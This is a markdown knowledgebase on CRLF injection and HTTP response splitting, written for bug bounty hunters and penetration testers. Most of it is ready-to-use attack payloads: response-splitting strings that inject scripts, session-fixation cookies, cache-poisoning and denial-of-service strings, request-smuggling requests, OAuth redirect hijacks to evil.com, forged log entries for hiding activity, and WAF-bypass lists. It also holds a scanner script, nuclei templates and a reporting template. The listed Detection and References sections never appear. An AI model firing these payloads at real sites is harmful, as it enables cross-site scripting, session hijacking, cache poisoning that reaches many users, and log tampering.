# CRLF Injection & HTTP Response Splitting — Research-Grade Knowledgebase

> **Classification**: Web Security / HTTP Abuse / Header Injection  
> **Scope**: Black-box testing, Bug Bounty, Advanced Exploitation Chains  
> **Last Updated**: 2026-05-24  
> **Sources**: Public security research, RFC 7230/7231, OWASP, community payloads, and open-source tooling.

---

## Table of Contents

1. [Basics](#basics)
2. [CRLF Injection Theory](#crlf-injection-theory)
3. [HTTP Header Internals](#http-header-internals)
4. [HTTP Response Splitting](#http-response-splitting)
5. [Header Injection Payloads](#header-injection-payloads)
6. [Set-Cookie Injection](#set-cookie-injection)
7. [Cache Poisoning + CRLF Chains](#cache-poisoning--crlf-chains)
8. [Log Poisoning Techniques](#log-poisoning-techniques)
9. [Open Redirect + CRLF Chains](#open-redirect--crlf-chains)
10. [Request Smuggling + CRLF Chains](#request-smuggling--crlf-chains)
11. [OAuth + CRLF Chains](#oauth--crlf-chains)
12. [HTTP Header Abuse Techniques](#http-header-abuse-techniques)
13. [Parser Confusion Payloads](#parser-confusion-payloads)
14. [Browser Quirks](#browser-quirks)
15. [Gadget Chains](#gadget-chains)
16. [Real World Case Studies](#real-world-case-studies)
17. [Fuzzing Payloads](#fuzzing-payloads)
18. [Automation Workflows](#automation-workflows)
19. [Recon Methodology](#recon-methodology)
20. [Nuclei Templates](#nuclei-templates)
21. [Tools and Scanners](#tools-and-scanners)
22. [Advanced Research](#advanced-research)
23. [Bug Bounty Writeups](#bug-bounty-writeups)
24. [Payload Collections](#payload-collections)
25. [WAF Bypasses](#waf-bypasses)
26. [Detection Techniques](#detection-techniques)
27. [References](#references)

---

## Basics

### What is CRLF Injection?

CRLF Injection occurs when an attacker injects Carriage Return (`\r`, ASCII 13, `%0D`) and Line Feed (`\n`, ASCII 10, `%0A`) characters into an HTTP message. These characters terminate lines in HTTP/1.x protocol messages. By injecting them into user-controlled input that is reflected into headers, an attacker can prematurely terminate the current header or response body and inject arbitrary protocol content.

### Why It Matters

HTTP parsers (servers, proxies, caches, browsers) use CRLF sequences to delimit:
- The end of a request line
- The end of each header field
- The end of the header section (empty line: `\r\n\r\n`)
- The framing of chunked transfer encoding

Injecting these delimiters allows an attacker to **redefine the semantic boundaries** of an HTTP message, leading to response splitting, header injection, cache poisoning, and desynchronization attacks.

### Attack Surface

Common injection points:
- URL parameters reflected in `Location`, `Set-Cookie`, or custom headers
- Host header manipulation in virtual hosting environments
- User-Agent, Referer, or custom header reflection
- Cookie values reflected in response headers
- Filename parameters in `Content-Disposition`
- Redirect destinations
- API response metadata fields

---

## CRLF Injection Theory

### The HTTP/1.x Line-Based Grammar

RFC 7230 defines HTTP/1.1 message framing:

```
HTTP-message   = start-line
                   *( header-field CRLF )
                   CRLF
                   [ message-body ]

header-field   = field-name ":" OWS field-value OWS

CRLF           = \r \n
```

The sequence `\r\n` is sacred. It is the only valid line terminator. Any attacker-controlled value that reaches a header field value without sanitization can inject this terminator and break the grammar.

### Injection Primitives

| Primitive | URL-Encoded | Hex | Description |
|-----------|-------------|-----|-------------|
| CR | `%0D` | `0x0D` | Carriage Return |
| LF | `%0A` | `0x0A` | Line Feed |
| CRLF | `%0D%0A` | `0x0D0A` | Standard line terminator |
| LF-only | `%0A` | `0x0A` | Some parsers accept bare LF |
| CR-only | `%0D` | `0x0D` | Rarely accepted alone |

### Where Injection Occurs

1. **Reflected Header Injection**: User input lands in a response header (e.g., `X-Custom-Header: <input>`)
2. **Redirect-Based Injection**: User input lands in a `Location` header
3. **Cookie Reflection**: User input is echoed into `Set-Cookie`
4. **Body-to-Header Transition**: In some frameworks, body content can bleed into headers under error conditions
5. **Proxy/Rewrite Rules**: Reverse proxies that rewrite URLs may inject user input into backend headers

### Differential Diagnosis

CRLF injection is often confused with:
- **HTTP Request Smuggling**: CRLF can be a *component* of smuggling, but smuggling focuses on boundary confusion between front-end and back-end
- **Host Header Injection**: May use CRLF as a delivery mechanism
- **Cache Poisoning**: CRLF is often the *prerequisite* gadget that enables cache poisoning

---

## HTTP Header Internals

### Header Field Structure

```http
Field-Name: Field-Value

```

The colon (`:`) separates name from value. The value can contain most ASCII characters except `\r`, `\n`, and NUL. However, many implementations are permissive.

### Header Folding (Obsolete but Dangerous)

RFC 7230 deprecated header folding (continuation lines prefixed with whitespace), but some legacy parsers still support it:

```http
X-Header: value1

          value2

```

This can be abused to smuggle headers through WAFs that only inspect the first line.

### Hop-by-Hop vs End-to-End Headers

| Type | Examples | Behavior |
|------|----------|----------|
| Hop-by-Hop | `Connection`, `Keep-Alive`, `Proxy-Authenticate`, `Transfer-Encoding`, `Upgrade`, `TE` | Consumed by proxies; not forwarded by default |
| End-to-End | `Cache-Control`, `Set-Cookie`, `X-Frame-Options`, `Content-Type` | Forwarded to the client |

CRLF injection into hop-by-hop headers can manipulate proxy behavior (e.g., forcing `Connection: close`).

### Dangerous Headers to Inject

```
Content-Length: 0


Content-Type: text/html

Location: https://evil.com

Set-Cookie: session=evil

Transfer-Encoding: chunked

X-Frame-Options: ALLOWALL

X-XSS-Protection: 0

Cache-Control: no-store

Last-Modified: <future>

```

---

## HTTP Response Splitting

### Concept

HTTP Response Splitting (HRS) occurs when CRLF injection allows an attacker to terminate the original response headers early and inject a complete second HTTP response. The attacker sends one request but causes the server (or an intermediary) to emit two responses.

### Classic Splitting Flow

```
Attacker Request:
  GET /page?lang=en%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<html>phished</html>

Server Response (conceptual):
  HTTP/1.1 302 Found
  Location: /en
  Set-Cookie: lang=en
  Content-Length: 0

  HTTP/1.1 200 OK
  Content-Type: text/html

  <html>phished</html>
```

The first response ends at `Content-Length: 0`. Everything after the double CRLF is parsed as a second HTTP response.

### Splitting via Content-Length Manipulation

```
%0D%0AContent-Length:%200%0D%0A%0D%0A
```

This terminates headers and declares a zero-length body. The subsequent bytes become a new response.

### Splitting via Transfer-Encoding

```
%0D%0ATransfer-Encoding:%20chunked%0D%0A%0D%0A0%0D%0A%0D%0A
```

Terminates with a chunked body of zero length, then starts a new response.

### Impact Scenarios

1. **XSS via Response Splitting**: Inject a 200 OK response with `Content-Type: text/html` and a script body
2. **Cache Poisoning**: The split response is cached by an intermediary, serving attacker content to other users
3. **Session Fixation**: Inject `Set-Cookie` headers in the split response
4. **Defacement**: Replace the entire page body

---

## Header Injection Payloads

### Basic CRLF Injection

```
%0D%0A
%0A
%0D
%0D%0A%0D%0A
```

### Header Injection Templates

```
# Inject a new header after an existing one
%0D%0AX-Injected: value

# Terminate headers and start body
%0D%0A%0D%0A<html><script>alert(1)</script></html>

# Content-Length truncation + new response
%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0A%0D%0A<script>alert(1)</script>

# Inject multiple headers
%0D%0AHeader1: value1%0D%0AHeader2: value2%0D%0A%0D%0A
```

### Parameter-Specific Patterns

```
# In a redirect parameter
?next=%0D%0ALocation:%20https://evil.com%0D%0A%0D%0A

# In a language/cookie parameter
?lang=en%0D%0ASet-Cookie:%20admin=1%0D%0A%0D%0A

# In a filename parameter
?file=name%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>

# In Host header (virtual hosting confusion)
Host: example.com%0D%0AX-Forwarded-Host:%20evil.com
```

### Double-Encoding & Nested Encoding

```
# Double URL encoding
%250D%250A

# Unicode normalization bypasses
%u000D%u000A







# HTML entity encoding (if reflected in HTML then parsed)
&#13;&#10;
&#x0D;&#x0A;
```

### Alternative Encodings

```
# Base64 contexts (if header value is base64-decoded)
# Inject CRLF inside base64 that decodes to CRLF
# Example: base64 of "
" is "DQo="

# JSON contexts
"\r\n"
"\u000d\u000a"

# XML contexts
&#13;&#10;
```

---

## Set-Cookie Injection

### Session Fixation

If user input reaches a `Set-Cookie` header value:

```
?pref=en%0D%0ASet-Cookie:%20sessionid=ATTACKER_VALUE%0D%0A%0D%0A
```

Result:
```http
Set-Cookie: pref=en
Set-Cookie: sessionid=ATTACKER_VALUE
```

The attacker can fixate a session ID, then wait for the victim to authenticate, granting the attacker access.

### Cookie Flag Injection

```
%0D%0ASet-Cookie:%20admin=1;%20HttpOnly;%20Secure;%20SameSite=None
```

### Cookie Overflow / Jar Overflow

Multiple injected `Set-Cookie` headers can overflow the browser's cookie jar, evicting legitimate cookies:

```
%0D%0ASet-Cookie:%20x=1%0D%0ASet-Cookie:%20x=2%0D%0ASet-Cookie:%20x=3%0D%0A...
```

### Bypassing Cookie Security Flags

Inject a cookie without `HttpOnly` or `Secure` to make it accessible via JavaScript or over HTTP:

```
%0D%0ASet-Cookie:%20session=STOLEN;%20path=/;%20domain=.target.com
```

---

## Cache Poisoning + CRLF Chains

### Concept

Web caches key responses by certain request components (URL, Host header, cookies). If CRLF injection allows an attacker to manipulate response headers such that the cache stores a malicious response and serves it to other users, this is **Web Cache Poisoning via CRLF**.

### Cache Key vs Unkeyed Input

| Cache Key | Unkeyed (can poison) |
|-----------|---------------------|
| URL path + query | Most headers |
| Host header | Body content (sometimes) |
| Method | Protocol version |

CRLF injection typically affects **unkeyed** response headers, making it ideal for cache poisoning.

### Poisoning via X-Cache Headers

Some caches use headers like `X-Cache-Key` or custom internal headers. If these are injectable:

```
%0D%0AX-Cache-Key:%20/malicious%0D%0A%0D%0A
```

### Poisoning via Content-Type

Force the cache to store an HTML response for a resource that should be JSON/JS:

```
%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>
```

When another user requests the same URL, they get `text/html` with the script.

### Cache Buster + CRLF Chain

```
GET /api/data?callback=legit%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>&cb=12345
```

The `cb` parameter busts the cache for the attacker's request, but the poisoned response is stored and served to users without the cache buster.

### Cache Poisoning to DoS

Poison the cache with a `404 Not Found` or `500 Internal Server Error`:

```
%0D%0AHTTP/1.1%20404%20Not%20Found%0D%0AContent-Length:%200%0D%0A%0D%0A
```

---

## Log Poisoning Techniques

### Concept

If CRLF-injected input reaches log files (access logs, error logs, WAF logs), an attacker can inject fake log entries, corrupt log parsers, or hide malicious activity.

### Apache/Nginx Access Log Poisoning

Inject newline characters into the User-Agent or Referer:

```
User-Agent: Mozilla/5.0%0D%0A127.0.0.1 - - [01/Jan/2026:00:00:00 +0000] "GET /admin HTTP/1.1" 200 1234
```

This creates a fake log entry showing a successful admin access from localhost.

### Log Injection to Evasion

Inject log entries that look like legitimate traffic to bury attack traces:

```
%0D%0A192.168.1.1 - - [01/Jan/2026:00:00:00] "GET /legitimate HTTP/1.1" 200 -
```

### SIEM/Log Parser Confusion

If logs are parsed as CSV, JSON, or key-value pairs, CRLF can break the parser:

```
?input=legit%0D%0Amalicious_key=malicious_value
```

---

## Open Redirect + CRLF Chains

### Header-Based Redirect

Inject a `Location` header to redirect the victim:

```
?return=%0D%0ALocation:%20https://evil.com%0D%0A%0D%0A
```

Result:
```http
HTTP/1.1 302 Found
Location: /original
Set-Cookie: return=
Location: https://evil.com

```

Browsers typically honor the **last** `Location` header, making this effective.

### Meta Refresh Injection

If headers are fully controllable, inject an HTML body with meta refresh:

```
%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<meta%20http-equiv="refresh"%20content="0;url=https://evil.com">
```

### JavaScript Redirect Injection

```
%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>window.location="https://evil.com"</script>
```

---

## Request Smuggling + CRLF Chains

### CRLF as a Smuggling Primitive

HTTP Request Smuggling exploits differences in how front-end and back-end servers determine request boundaries. CRLF injection can be used to inject fake `Content-Length` or `Transfer-Encoding` headers that desynchronize the parser pair.

### CL.TE Desync via CRLF

Inject a `Transfer-Encoding: chunked` header into a request that the front-end parses as `Content-Length`:

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

5

GPOST /admin HTTP/1.1

Host: target.com



0



```

If the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding`, the back-end will process `GPOST /admin` as a new request.

### TE.CL Desync via CRLF

The reverse: front-end uses chunked, back-end uses Content-Length.

### Header Injection to Force Chunked

If you can inject headers into a request via CRLF (e.g., in a Host header or parameter), you can force the back-end to see chunked encoding:

```
Host: target.com%0D%0ATransfer-Encoding:%20chunked%0D%0A%0D%0A0%0D%0A%0D%0A
```

### HTTP/2 to HTTP/1.1 Downgrade

HTTP/2 headers are binary and should not contain CRLF. However, when downgraded to HTTP/1.1, some translation layers fail to sanitize `:authority` or `:path` pseudo-headers, allowing CRLF smuggling into the HTTP/1.1 request.

```
:path: /page?lang=%0D%0AContent-Length:%200%0D%0A%0D%0A
```

After downgrade:
```http
GET /page?lang=
Content-Length: 0

HTTP/1.1
```

---

## OAuth + CRLF Chains

### Redirect URI Header Injection

OAuth flows rely on `redirect_uri`. If the authorization server reflects this into a `Location` header without sanitization:

```
?redirect_uri=https://legit.com%0D%0ALocation:%20https://evil.com%0D%0A%0D%0A
```

### State Parameter Injection

The `state` parameter is often reflected in response headers or response bodies:

```
?state=legit%0D%0ASet-Cookie:%20oauth_session=HIJACKED%0D%0A%0D%0A
```

### OAuth Cache Poisoning

If the OAuth authorization endpoint is behind a cache, CRLF injection can poison the cache to serve attacker-controlled authorization pages, stealing authorization codes.

---

## HTTP Header Abuse Techniques

### Content-Length Manipulation

```
%0D%0AContent-Length:%200%0D%0A%0D%0A
```

Truncates the body. Essential for response splitting.

### Transfer-Encoding: chunked Abuse

```
%0D%0ATransfer-Encoding:%20chunked%0D%0A%0D%0A0%0D%0A%0D%0A
```

Terminates a chunked body early.

### X-Forwarded-* Header Injection

```
%0D%0AX-Forwarded-For:%20127.0.0.1%0D%0A
%0D%0AX-Real-IP:%20127.0.0.1%0D%0A
%0D%0AX-Forwarded-Host:%20internal.local%0D%0A
```

Bypass IP-based access controls or internal routing.

### Hop-by-Hop Header Injection

```
%0D%0AConnection:%20close%0D%0A
%0D%0AConnection:%20keep-alive%0D%0A
```

Manipulate connection persistence.

### Security Header Stripping

```
%0D%0AX-Frame-Options:%20ALLOWALL%0D%0A
%0D%0AContent-Security-Policy:%20default-src%20*;%20script-src%20*%0D%0A
%0D%0AStrict-Transport-Security:%20max-age=0%0D%0A
%0D%0AX-Content-Type-Options:%20nosniff%0D%0A
```

---

## Parser Confusion Payloads

### LF-Only Tolerance

Some parsers accept bare LF (`%0A`) without CR:

```
%0ALocation:%20https://evil.com
```

### CR-Only Tolerance

Rare, but some custom parsers accept bare CR:

```
%0DLocation:%20https://evil.com
```

### Mixed Terminators

```
%0D%0A%0A
%0A%0D%0A
%0D%0A%0D
```

### Null Byte Injection

Some C-based string functions terminate at NUL (`%00`), which can truncate WAF rules before they see the CRLF:

```
%00%0D%0A
```

### Tab vs Space

HTTP allows tabs or spaces after the colon. Some parsers are confused by:

```
%0D%0AX-Header%09:%09value
```

### Unicode Overlong Encodings

UTF-8 overlong encodings of ASCII characters (now largely rejected, but worth testing):

```
# Overlong encoding of CR (should be rejected by compliant UTF-8)
%c0%8d
# Overlong encoding of LF
%c0%8a
```

---

## Browser Quirks

### Firefox UTF-8 Stripping Behavior

Firefox historically stripped non-ASCII bytes from cookie values, which could transform multi-byte UTF-8 characters into CRLF bytes:

| Character | UTF-8 Hex | Last Byte |
|-----------|-----------|-----------|
| `嘊` | `%E5%98%8A` | `%0A` (LF) |
| `嘍` | `%E5%98%8D` | `%0D` (CR) |
| `嘾` | `%E5%98%BE` | `%3E` (>) |
| `嘼` | `%E5%98%BC` | `%3C` (<) |

Payload:
```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(1)嘾
```

URL-encoded:
```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%281%29%E5%98%BE
```

### Chrome/Safari Cookie Handling

Modern Chromium-based browsers strictly reject cookies with control characters. However, if the server reflects the CRLF into response headers (not cookies), the browser will parse the split response.

### IE/Edge Legacy Behaviors

Legacy Internet Explorer was notoriously permissive with malformed HTTP responses. It would honor `Location` headers even in malformed responses and was vulnerable to response splitting-based XSS.

### Browser Cache Key Differences

Browsers cache differently than reverse proxies:
- Chrome: Keys by URL + Vary headers
- Firefox: Similar, but handles `Cache-Control: no-store` differently
- Safari: Aggressive caching of redirects

A response split that poisons a browser's local cache can persist until cleared.

---

## Gadget Chains

### CRLF → XSS Gadget

```
%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0AX-XSS-Protection:%200%0D%0A%0D%0A%3Csvg%20onload=alert(document.domain)%3E
```

1. Terminate original response
2. Start new 200 OK
3. Set `Content-Type: text/html`
4. Disable XSS filter
5. Inject SVG XSS payload

### CRLF → Cache Poisoning Gadget

```
%0D%0AContent-Type:%20text/html%0D%0ALast-Modified:%20Mon,%2001%20Jan%202026%2000:00:00%20GMT%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
```

1. Poison `Content-Type` so cache stores HTML
2. Set `Last-Modified` to future for persistent caching
3. Body contains XSS payload

### CRLF → Session Fixation Gadget

```
%0D%0ASet-Cookie:%20session=FIXATED;%20Path=/;%20HttpOnly%0D%0A%0D%0A
```

1. Inject session cookie
2. Victim authenticates → session bound to attacker ID
3. Attacker uses fixed session

### CRLF → Open Redirect Gadget

```
%0D%0ALocation:%20https://evil.com%0D%0A%0D%0A
```

Simple but effective when injected into a redirect parameter.

### CRLF → Request Smuggling Gadget

```
%0D%0ATransfer-Encoding:%20chunked%0D%0A%0D%0A0%0D%0A%0D%0AGPOST%20/admin%20HTTP/1.1%0D%0AHost:%20target.com%0D%0A%0D%0A
```

1. Force chunked encoding on back-end
2. Terminate chunk
3. Smuggle new request

---

## Real World Case Studies

### Case Study: Twitter CRLF to XSS (2015)

A CRLF injection in Twitter's URL handling allowed injection of `Location` and body content. The attacker used response splitting to inject a 200 OK response with `Content-Type: text/html`, achieving reflected XSS.

**Lesson**: Even modern platforms can have CRLF injection in redirect handlers.

### Case Study: Starbucks CRLF Injection (2016)

`newscdn.starbucks.com` had a CRLF injection in a CDN edge configuration. The vulnerability allowed HTTP response splitting and XSS via header injection.

**Lesson**: CDN edge configurations that reflect URL parameters into headers are high-risk.

### Case Study: Cache Poisoning at Scale (PortSwigger Research)

James Kettle's research demonstrated that unkeyed headers (like `X-Forwarded-Host`) could be combined with CRLF-like behaviors (or direct header injection) to poison caches at scale. While not always pure CRLF, the same grammar-breaking principles apply.

**Lesson**: Cache poisoning is a mass-exploitation vector, not just a single-user attack.

### Case Study: HTTP/2 Desync (2023+)

HTTP/2 to HTTP/1.1 downgrades have introduced new CRLF smuggling vectors. The `:authority` and `:path` pseudo-headers, when containing encoded CRLF, can be translated into HTTP/1.1 requests that split responses or desync request queues.

**Lesson**: Modern HTTP/2 deployments are not immune; downgrade paths reintroduce HTTP/1.1 vulnerabilities.

---

## Fuzzing Payloads

### Core Payload List

```
%0D%0A
%0A
%0D
%0D%0A%0D%0A
%00%0D%0A
%0D%0A%00
%0A%0D%0A
%0D%0A%20
%20%0D%0A
%09%0D%0A
%0D%0A%09
%0D%0A%0D
%0D%0A%0A%0D%0A












&#13;&#10;
&#x0D;&#x0A;

Content-Length: 0



Location: https://evil.com



Set-Cookie: x=1


```

### Context-Specific Payloads

**URL Parameter (redirect):**
```
?next=%0D%0ALocation:%20https://evil.com
?next=%0D%0A%0D%0A<script>alert(1)</script>
```

**Cookie Value:**
```
Cookie: session=abc%0D%0ASet-Cookie:%20admin=1
```

**User-Agent:**
```
User-Agent: Mozilla/5.0%0D%0AX-Injected: 1
```

**Referer:**
```
Referer: https://example.com%0D%0ALocation: https://evil.com
```

**Host Header:**
```
Host: example.com%0D%0AX-Forwarded-Host: evil.com
```

**JSON Body:**
```json
{"name": "test\r\nX-Header: injected"}
```

**XML Body:**
```xml
<name>test&#13;&#10;X-Header: injected</name>
```

### Polyglots

```
%0D%0A%0A%00%0D%0A%0D%0A%0A%0D
```

This covers CR, LF, NUL, and mixed sequences.

---

## Automation Workflows

### Burp Suite Workflow

1. **Identify Injection Points**: Use Burp Scanner or manual proxy review to find parameters reflected in headers.
2. **Send to Repeater**: Test each parameter with `%0D%0A` and observe response headers.
3. **Check for Header Reflection**: Look for new lines in the response header section.
4. **Attempt Response Splitting**: Use `Content-Length: 0` + double CRLF + new response.
5. **Verify with Browser**: If splitting succeeds, verify in browser with cache disabled.

### Custom Python Scanner

```python
import requests

TARGET = "https://target.com/redirect"
PARAM = "url"
PAYLOADS = [
    "%0D%0AX-CRLF-Test: 1",
    "%0D%0AContent-Length: 0%0D%0A%0D%0A",
    "%0D%0ALocation: https://evil.com",
]

for payload in PAYLOADS:
    url = f"{TARGET}?{PARAM}={payload}"
    resp = requests.get(url, allow_redirects=False, timeout=10)
    headers = str(resp.headers)
    if "X-CRLF-Test" in headers or "evil.com" in headers:
        print(f"[+] Potential CRLF: {payload}")
        print(f"    Status: {resp.status_code}")
```

### ffuf Workflow

```bash
# Fuzz a parameter with CRLF payloads
ffuf -u "https://target.com/page?lang=FUZZ"      -w crlf_payloads.txt      -H "X-Check: 1"      -mr "X-CRLF-Test"      -mc all

# Wordlist should contain encoded and raw variants
```

### nuclei Workflow

```bash
# Run CRLF-specific templates
nuclei -u https://target.com -t http/vulnerabilities/crlf/

# With custom tags
nuclei -u https://target.com -t crlf-injection.yaml -severity high
```

---

## Recon Methodology

### Step 1: Identify Header Reflection

Look for:
- Redirect parameters (`?next=`, `?return=`, `?redirect=`)
- Language/locale parameters (`?lang=`, `?locale=`)
- Filename parameters (`?file=`, `?download=`)
- Cookie-setting endpoints
- API endpoints that echo headers in CORS preflight responses

### Step 2: Test for CRLF Injection

Send `%0D%0A` followed by a recognizable string:

```
?lang=en%0D%0AX-CRLF-Check: 1337
```

Check if `X-CRLF-Check: 1337` appears in response headers.

### Step 3: Determine Exploitation Path

| Finding | Exploitation |
|---------|-------------|
| Header injection only | XSS, open redirect, cookie injection |
| Response splitting possible | Cache poisoning, full response control |
| In request path (HTTP/2) | Request smuggling, desync |
| In logs | Log poisoning, evasion |

### Step 4: Chain with Other Vulnerabilities

- **+ XSS**: Inject `Content-Type: text/html` + body
- **+ Cache Poisoning**: Find cache layer, verify cache key behavior
- **+ Request Smuggling**: Test in HTTP/2 downgrade contexts
- **+ OAuth**: Test `redirect_uri`, `state` parameters

### Step 5: Verify Impact

- For XSS: Execute `alert(document.domain)` in browser
- For Cache Poisoning: Use `Cache-Control` headers, verify cross-user impact
- For Session Fixation: Verify cookie is set and honored
- For Redirect: Verify browser follows injected `Location`

---

## Nuclei Templates

### Basic CRLF Detection Template

```yaml
id: crlf-injection-detection

info:
  name: CRLF Injection Detection
  author: custom
  severity: high
  description: Detects CRLF injection via header reflection
  tags: crlf, injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?next=%0D%0AX-CRLF-Check:{{randstr}}"
      - "{{BaseURL}}/page?lang=%0D%0AX-CRLF-Check:{{randstr}}"

    matchers:
      - type: regex
        part: header
        regex:
          - "X-CRLF-Check:.*{{randstr}}"
```

### Response Splitting Detection

```yaml
id: http-response-splitting

info:
  name: HTTP Response Splitting
  author: custom
  severity: critical
  description: Detects HTTP response splitting via Content-Length manipulation

dns:
  - name: "{{interactsh-url}}"
    type: A

requests:
  - raw:
      - |
        GET /?next=%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Chtml%3E{{interactsh-url}}%3C/html%3E HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### Set-Cookie Injection Detection

```yaml
id: set-cookie-injection

info:
  name: Set-Cookie Header Injection
  author: custom
  severity: high
  description: Detects CRLF injection allowing arbitrary cookie setting

requests:
  - method: GET
    path:
      - "{{BaseURL}}/setlang?lang=en%0D%0ASet-Cookie:%20crlf_test={{randstr}}"

    matchers:
      - type: regex
        part: header
        regex:
          - "Set-Cookie:.*crlf_test={{randstr}}"
```

### Cache Poisoning via CRLF

```yaml
id: crlf-cache-poisoning

info:
  name: CRLF Cache Poisoning
  author: custom
  severity: critical
  description: Detects cache poisoning via unkeyed header injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/data?callback=legit%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E&cb={{randstr}}"

    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"
      - type: word
        part: header
        words:
          - "X-Cache: hit"
```

---

## Tools and Scanners

### Active Scanners

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | Manual + automated testing | Proxy + Repeater + Scanner |
| **OWASP ZAP** | Open-source alternative | Active Scan → Injection |
| **Nuclei** | Fast template-based scanning | `nuclei -t http/vulnerabilities/crlf/` |
| **Crlfuzz** | Dedicated CRLF fuzzer | `crlfuzz -u "https://target.com/?url="` |
| **Smuggler** | HTTP Request Smuggling | `python smuggler.py -u https://target.com` |
| **HTTP Request Smuggler (Burp)** | Desync detection | Install from BApp Store |
| **Param Miner** | Parameter discovery | Install from BApp Store |

### Recon Tools

| Tool | Purpose |
|------|---------|
| **httpx** | Fast HTTP probing | `httpx -l targets.txt -path /redirect?url=%0D%0AX-Test:1` |
| **katana** | Web crawler | `katana -u https://target.com -jc` |
| **subfinder** | Subdomain enumeration | `subfinder -d target.com` |
| **cariddi** | URL extraction + scanning | `cariddi -u https://target.com` |

### Exploitation Helpers

| Tool | Purpose |
|------|---------|
| **Interactsh** | Out-of-band detection | `interactsh-client` |
| **dnsx** | DNS probing | `dnsx -l domains.txt` |
| **notify** | Alerting | Pipe nuclei results to notify |

---

## Advanced Research

### HTTP/2 Binary Header Abuse

HTTP/2 uses HPACK compression and binary framing. However:
- `:authority` containing `%0D%0A` may be passed unsanitized to HTTP/1.1 backends
- HTTP/2 CONTINUATION frames can be used to smuggle headers
- Some implementations decode percent-encoded pseudo-headers before validation

### Web Cache Entanglement

PortSwigger's research on cache entanglement showed that when caches and origin servers disagree on what constitutes a "response", CRLF-like behaviors (or direct header injection) can create persistent, cross-user poisoned states that survive cache purges.

### Browser-Powered Desync

Modern desync attacks use browser behavior (fetch API, CORS preflight) to trigger smuggled requests. CRLF injection in CORS-relevant headers (`Origin`, `Access-Control-Request-Headers`) can be combined with smuggling to achieve cross-origin impact.

### HTTP/1.1 "Must Die" Context

As HTTP/2 and HTTP/3 proliferate, HTTP/1.1 is increasingly handled by translation layers. These layers are where CRLF injection resurfaces—especially in:
- gRPC-Web gateways
- GraphQL HTTP bridges
- Serverless function proxies
- API gateways (AWS API Gateway, Azure Front Door, Cloudflare)

### Hidden OAuth Attack Vectors

OAuth endpoints are prime CRLF targets because:
- They must reflect `redirect_uri` for validation
- They generate redirect responses by design
- They often sit behind caches for performance
- `state` parameter reflection is common

---

## Bug Bounty Writeups

### Key Findings from Public Disclosures

1. **Twitter (2015)**: CRLF in URL shortener → response splitting → XSS
2. **Starbucks (2016)**: CDN edge CRLF → header injection → XSS (`newscdn.starbucks.com`)
3. **Multiple Platforms**: `?next=` and `?return=` parameters are consistently the highest-yield injection points
4. **Cache Providers**: Cloudflare, Fastly, Akamai have all had edge cases where CRLF in headers caused cache poisoning

### Methodology from Writeups

Common patterns in successful reports:
1. **Find the redirect**: Almost every CRLF bug bounty starts with a redirect parameter
2. **Verify header reflection**: Send `%0D%0AX-Check: 1`, confirm in response
3. **Attempt splitting**: `Content-Length: 0` + new response
4. **Check caching**: Add cache-buster, verify `X-Cache` headers
5. **Maximize impact**: Show cross-user impact (cache) or session hijacking (cookies)

### Reporting Template

```
Title: CRLF Injection leading to [XSS/Cache Poisoning/Redirect] on [endpoint]

Summary:
The [parameter] parameter on [endpoint] reflects user input into the HTTP
response headers without sanitizing CRLF sequences. This allows an attacker
to [inject headers/split responses/poison caches].

Steps to Reproduce:
1. Visit: https://target.com/redirect?next=[PAYLOAD]
2. Observe [new header / split response / cached payload]

Impact:
- [XSS]: Arbitrary JavaScript execution
- [Cache Poisoning]: Stored XSS for all users
- [Redirect]: Open redirect to attacker domain
- [Session Fixation]: Cookie injection

Mitigation:
- Strip CR and LF from all user input before reflection into headers
- Use a whitelist approach for redirect destinations
- Implement proper HTTP response framing validation
```

---

## Payload Collections

### Minimal Test Set

```
%0D%0A
%0A
%0D
%0D%0A%0D%0A
%00%0D%0A
```

### Header Injection Set

```
%0D%0AX-Injected: 1
%0D%0AContent-Length: 0
%0D%0ALocation: https://evil.com
%0D%0ASet-Cookie: x=1
%0D%0AContent-Type: text/html
%0D%0AX-XSS-Protection: 0
%0D%0ATransfer-Encoding: chunked
%0D%0AConnection: close
```

### Response Splitting Set

```
%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E

%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20302%20Found%0D%0ALocation:%20https://evil.com%0D%0A%0D%0A

%0D%0ATransfer-Encoding:%20chunked%0D%0A%0D%0A0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A%0D%0A%3Chtml%3Ehacked%3C/html%3E
```

### WAF Bypass Set

```
%0D%0A%20
%20%0D%0A
%09%0D%0A
%0D%0A%09
%0D%0A%00
%00%0D%0A
%0D%0A%0D
%0D%0A%0A%0D%0A






&#13;&#10;
&#x0d;&#x0a;
